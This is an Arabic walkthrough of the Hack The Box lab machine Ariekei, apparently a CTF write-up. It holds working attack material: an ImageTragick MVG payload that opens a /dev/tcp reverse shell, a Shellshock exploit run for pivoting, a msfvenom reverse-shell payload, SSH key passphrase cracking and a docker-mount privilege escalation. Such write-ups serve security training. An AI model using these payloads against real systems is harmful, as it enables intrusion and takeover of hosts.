---
description: حل Ariekei بالعربي
---

# Ariekei - بالعربي

![Let&apos;s show some fucking INSANE bb](../.gitbook/assets/image%20%284%29.png)

1- تبدأ الاول بعمل Scan على الماشين ب nmap عشان تشوف ال Open Ports الموجودة و ال services/الخدمات و شو منهم فيه ثغرة/vulnerable فتستغله و طبعا بدون عمل استطلاع/recon او enumeration ما ممكن تبدأ اي عملية Pentesting او Hacking  


![nmp scan results](../.gitbook/assets/image%20%288%29.png)

طيب ناو تحلل نتائج الفحص و متل ما شايف عندك

#### 22 tcp \(ssh\), 443 tcp \(https - web server\), 1022 tcp \(ssh too !\) 

طيب هون في شيء مثير للفضول ! ليش في اتنين ssh ??  


![](../.gitbook/assets/image%20%285%29.png)

الي محدده بالاحمر بدل على بعض الامور منها ان في  

Network Address Translate \(NAT\)

بحصل على اكتر من هوست./ Multiple Hosts

متل ما شايف بالصورة في  DNS ف نحن رح تاخد ال subs هدول و تحطهم بال 

```text
/etc/hosts
```

![subdomains added to /etc/hosts](../.gitbook/assets/image%20%2846%29.png)

هلق تتصفح ال subdomains لي ضفتهم   


![https://calvin.ariekei.htb/](../.gitbook/assets/image%20%2822%29.png)

![https://beehive.ariekei.htb/](../.gitbook/assets/image%20%2812%29.png)

طبعا كلعادة على الويب لازم تعمل استطلاع و فحص / scan & enum عشان تشوف لو في شي تستغل او تستفيد منه و يخليك تفهم اكتر عن البيئة الي بتهاجمها و بما انه ويب  ف رح استخدم شوية ادوات متل dirb, gobuster , dirsearch, wfuzz 

اول شي بدأت ب dirb على  [https://calvin.ariekei.htb/](https://calvin.ariekei.htb/) و لقيت هذا

```text
https://calvin.ariekei.htb/upload
```

![https://calvin.ariekei.htb/upload](../.gitbook/assets/image%20%281%29.png)

و لما شفت نتائج dirb على [https://beehive.ariekei.htb/](https://beehive.ariekei.htb/) لقيت

```text
+ https://beehive.ariekei.htb/cgi-bin/ (CODE:403|SIZE:295)
```

رحت مشغل عليه wfuzz كلاتي : 

```text
wfuzz --hc 404 -u https://beehive.ariekei.htb/cgi-bin/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
```

و اول شغلة وقعت عليها عيني هي

```text
000000171:   200        36 L     99 W     1255 Ch     "stats"
```

نتصفحها 

![https://beehive.ariekei.htb/cgi-bin/stats](../.gitbook/assets/image%20%2834%29.png)

هي ثغرة shell shock و للاسف بعد عدة محاولات سواء يدوي او بالاستغلال هاد  \([اضغط هنا](https://www.exploit-db.com/exploits/34900)\)  
ايضا ما اشتغل و واضح ان في  WAF فعديتها و رجعت لل upload فوق, ازا طلعنا على الكود المصدري / source code رح نلاقي الاتي :

![view-source:https://calvin.ariekei.htb/upload](../.gitbook/assets/image%20%286%29.png)

الوجهين هدول علامة لل tragic و الي معناه "مأساة" و بما انو الامر upload image ف رح تفهم ان الدلالة  لاحد الثغرات اسمها imagetragick هي موقع خاص بالثغرة\([اضغط هنا](https://imagetragick.com/)\)و انا رح اشرحها الان 

{% hint style="info" %}
حسب الموقع الثغرة هي الها اكتر من شكل و هي تحديدا بالمكتبة / library الي اسمها [ImageMagick](https://imagemagick.org/index.php) و الي بحد ذاتها موجودة بأكتر من لغة برمجة.

طيب من الاشياء المصابة بيها هي RCE و السبب وراء ال RCE ان ما بحصل عملية تصفية / filtering ل الي بتم ادخاله من قبل المستخدم بشكل صح و الامر بحصل كلاتي : 

قال ان imagemagick بتسمح بمعالجة الصور باستخدام مكتبات خارجية عن طريق ميزة اسمها **delegate**  و الي هي اصلا فيها 

**system\(\)** 

و الي بتاخد الامر من ملف config اسمه delegate.xml فبسبب التصفية الغير صحيحة للمدخلات الي بتوصل للعامل / parameter الي هو 

**%M**

فبتحصل حقن الاوامر و وحدة من ال delegate's الافتراضية ان بقبل يعالج https request بالشكل الاتي :

 

```text
"wget" -q -O "%o" "https:%M"
```

مكان ال %M بحصل الحقن كلاتي :



```text
`https://example.com";|ls "-la`
```

فشكل ال payload رح يكون كلاتي:



```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i>/dev/tcp/10.10.14.10/1111 0<&1 2>&1")'ms
pop graphic-context
```

طبعا غير ال ip & port  لل ip & port الخاصين فيك و للعلم رح يكون الملف بصيغة **mvg** 
{% endhint %}

بعد تكون شغلت ال netcat و رفعت ال exploit.mvg رح يجيك ال shell

![Got shell](../.gitbook/assets/image%20%2826%29.png)

الي يعتبر غريب هون ان انا Root على  طول !  
اول ما شفت common عرفت ان الموضوع فيه Docker

![](../.gitbook/assets/image%20%2838%29.png)

طيب بما ان الموضوع فيه Docker هاد بدعم نظرية وجود NAT على multiple hosts   
حاولت اعمل ifconfig بس ما موجود على هي ال Docker ف تروح لل 

**/common**

![](../.gitbook/assets/image%20%2840%29.png)

في 

**.secrets**

![](../.gitbook/assets/image%20%2835%29.png)

رح تاخد ال **bastion\_key**  و نستخدمه عشان ن SSH على البوكس  
طبعا ما تنسى تخلي صلاحيات الملف 600   
طيب مع اول محاولة هون ما اشتغل و كان الامر متل 

![](https://media.giphy.com/media/457NTDOuMmDfO/source.gif)

بعد محاولات

![](https://media.giphy.com/media/SWoRKslHVtqEasqYCJ/source.gif)

بالاخر اتذكرت ان في بورت تاني لل ssh فجربته كلاتي :

```text
ssh root@10.10.10.65 -i bastion_key -p 1022
```

![SSHed](../.gitbook/assets/image%20%2844%29.png)

حاليا انا داخل ك SSH يعني الحياة اجمل  فخلينا نجرب ال **ifconfig** 

![](../.gitbook/assets/image%20%2816%29.png)

\*\*\*\*

![](https://media.giphy.com/media/l0HlFZ3c4NENSLQRi/source.gif)

بس ليش ؟ لانو المعلم بالاحمر بدل ان نظرية ال NAT on multiple hosts صحيحة و في هون متل ما شايف two network interfaces و الي بعني بهي الحالة ان الجهاز نفسه متصل ع شبكتين و كل شبكة على interface لوحده و بسموا الشكل هاد

**Dual Homed Machines** or  **Jump point/Jump host**

و الفكرة انها بتساعد بال **Pivoting** !

طيب ازا بتتزكر بال common كان في مجلدات تانية ما شفتها   
بال 

> /common/containers/bastion-live

ازا عملت cat لل  Dockerfile رح تشوف الاتي:

![Root Password](../.gitbook/assets/image%20%289%29.png)

هي كلمة السر لل رووت , طبعا نحن هيك هيك رووت بس ممكن يفيدنا فيما بعد  
انا ما دورت هون كتير و رحت لل

> /common/network

لان الاسم شدني كتير و في جواه ملف باسم **make\_nets.sh** 

![make\_nets.sh](../.gitbook/assets/image%20%2836%29.png)

طيب متل ما واضح عبارة عن ملف باش بطبق امرين و مكتوب كل امر شو شغلته بتعليق فوقه

> اول امر رح يعمل حاوية / container معزولة و مابدخلها نت
>
> تاني امر رح يعمل حاوية / container بس هي live و بدخلها نت

انا بالاصل بعرف الشبكتين الموجودات عندي من النتائج تبعيت ال ifconfig بس هون في شوية تفاصيل اكتر متل ال range و ال gateway   
طيب شو فيني اعمل اكتر ؟ انا عن نفسي و المفروض يصير ان تعمل فحص و استطلاع اكتر و تفهم شو في جوا و على الاقل تعمل ping sweep تشوف مين موجود.  
خليني اقول ان بال real world ازا الحماية ما واقعة ما فينك تلعب كل هاد اللعب بهي السهولة 🙂 

قبل ما ابدأ عملت ping بس كرمال اتاكد ان كلو شغال و مافي شبكة واقعة او اي مشكلة

![](../.gitbook/assets/image%20%2837%29.png)

ناو نبدأ, انا استخدم liner command و الي هو عبارة عن امر لينكس واحد, كرمال اسهل الموضوع على نفسي   
روح على ال /tmp لان هنيك مسموح تكتب 

```text
for i in $(seq 2 254);do echo 172.23.0.$i;done > 172.23.0.1.txt  
```

هاد الامر بس بطبع من 2 ل 254 مكان اخر خانة بال IP و بحفظهم بملف بنفس اسم الشبكة

![](../.gitbook/assets/image%20%2821%29.png)

رح تعمل نفس الموضوع على الشبكة التانية

{% embed url="https://172.24.0.1" %}

```text
for i in $(cat '172.23.0.1.txt');do ping -c 2 $i;done > pinged.txt  
```

هو بدأ ال ping sweep و حاليا رح يحصل ping لمرتين على كل IP و رح يحط كل النتائج جوا pinged.txt 

```text
cat pinged.txt | grep ttl | cut -d " " -f 4 | cut -d ':' -f 1 | sort -u > alive.txt  
```

ببساطة هون بفلتر النتائج تبعيت ال ping للشغال بس و بحطهم ب ملف اسمو alive.txt 

```text
for i in {22,21,23,80,443,139,445,1022};do nc 172.23.0.253  $i;done  
```

هون حطيت ال nc IP جوا loop بحيث يحاول يتصل على ال IP عبر كل ال ports هي و هيك بعرف شو ال ports المفتوحة

كرر هي العملية على الشبكة التانية !

طيب بعد كل هيدا الكلام و ماطلعت بشي ههههههه  
دماغي :

{% embed url="https://media.giphy.com/media/l4hmWKVDDUpiq355K/source.mp4" %}



نرجع مرة تانية لل /common و لل /containers   
و بعد لف و دوران و enum و قرأت كل الملفات لقيت هاد الملف بالمسار الاتي:

> /common/containers/waf-live

و يلا 

```text
cat nginx.conf
```

![cat nginx.conf](../.gitbook/assets/image%20%2830%29.png)

بالاصل بعرف ان في عندي subdomain باسم beehive.ariekei.htb ف واضح ان التحت هو ال IP الخاص فيه و الي بعرفه كمان ان هاد ال subdomain مصاب ب shellshock و الي ماقدرت استغلها بسبب ال WAF , فرح استغلها بنفس الاستغلال بس و انا جوا !

1-شغل ع جهازك ال SimpleHTTPServer   
2- روح لل tmp/ و حمل الاستغلال على البوكس من جهازك ب wget   
3- نشغل الاستغلال

```text
python 34900.py payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats  
```

{% hint style="info" %}
حطيت ال lhost=172.24.0.253 لان هاد ال IP الخاص فيني على ال eth1 interface فمعنى اخر هاد ال IP الي على نفس شبكة ال docker container الي عليها ال server المصاب !
{% endhint %}

![](../.gitbook/assets/image%20%2842%29.png)

و بوووم , نجح ال Pivoting ! 

حاولت اشوف ال user.txt و ما نفع ما معي صلاحيات

![](../.gitbook/assets/image%20%2843%29.png)

و ال shell جدا سيء , فرح اسوي تكنيك بسمى 

#### persistence

رح استخدم هون ال msfvenome & msfconsole   
كرمال تعمل ال payload بالاول

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf  
```

و حاليا شغل ال msfconsole و استخدم ال multi/handler و حط ال options الخاصة فيها  
و بعدها ارفع ال payload على البوكس بال wget متل ما عملت من قبل.

```text
chmod +x shell.elf
```

و شغل ال shell.elf 

![](../.gitbook/assets/image%20%2823%29.png)

حاليا فيني استخدم خاصية shell و احصل shell اكثر اناقة 😂😂  
بعدها استخد الامر التالي :

```text
python -c "import pty;pty.spawn('/bin/bash');"
```

بحيث spawn TTY shell 

ناو بعد تفكير عميق اتذكرت ان معي ال root password ف عملت su و حطيت كلمة السر الخاصة بالرووت و صرت رووت 🙂

![I&apos;m R00t](../.gitbook/assets/image%20%2839%29.png)

بعدها بس cat user.txt و حصلت اول علم / flag !

بالمسار هاد في  id\_rsa key رح  تاخد و تحاول تتصل فيه

> /home/spanishdancer/.ssh

متل ما شايف عم يطلب كلمة سر , فلازم نكسره / crack 

![id\_rsa asks for passphrase](../.gitbook/assets/image%20%2813%29.png)

لحتى نكسره بالاول رح نستخدم اداة ssh2.john.py 

```text
/usr/share/john/ssh2john.py id_rsa > id_rsa_john  
```

```text
john id_rsa_john
```

![Got passwords](../.gitbook/assets/image%20%2848%29.png)

> purple1

![SSHed](../.gitbook/assets/image%20%2811%29.png)

متل ما شايف هون فيني اشغل docker 

![](../.gitbook/assets/image%20%2810%29.png)

بعد ما قرأت حبتين حلويين عن ال docker exploitation عرفت كيف استغل docker بحيث اجيب root , الامر مشابه لل lxd exploitation 

```text
docker run -v /:/root -i -t bash
```

حسب ما فهمت من ال help و ال write ups الي قرأتها الي بحصل كلاتي : 

{% hint style="info" %}
1-ال v- عشان ال volume   
2- t- عشان ال tty  
3- i- لل interactive   
ف الي بحصل اني انا متل بنسخ كلشي بال / و الي هو كل  ملفات النظام لداخل حاوية / container جوا المجلد الي حطيت اسمه متل هون سميته root ف رح لاقي كل مجلدات النظام منسوخة ل جوا ال root لو حطيت شيء اخر متل tmp رح تلاقي كلهم منسوخ لجوا ال tmp
{% endhint %}

  


![I&apos;m the R00t of The R00t](../.gitbook/assets/image%20%2814%29.png)

![The End](../.gitbook/assets/image%20%2833%29.png)

و بهذا يا صديقي انتهت حلقتنا.  
السلام عليكم.

